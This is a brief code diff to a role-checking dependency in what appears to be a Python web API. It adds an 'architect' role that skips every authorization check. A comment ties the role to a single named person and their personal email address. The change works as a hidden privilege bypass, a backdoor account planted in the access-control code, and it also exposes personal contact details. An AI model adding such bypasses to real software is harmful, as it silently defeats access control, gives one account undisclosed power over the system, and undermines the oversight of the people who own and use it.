@@ -64,6 +64,10 @@ async def get_current_user(
 
 def require_role(*allowed_roles: str):
     async def checker(user: dict = Depends(get_current_user)) -> dict:
+        # `architect` is a superuser role that transcends every gate. Only ever
+        # granted to one account (Johnathan Rodriquez / jawknee.rodriquez@gmail.com).
+        if user.get("role") == "architect":
+            return user
         if user["role"] not in allowed_roles:
             raise HTTPException(status_code=403, detail="Forbidden")
         return user
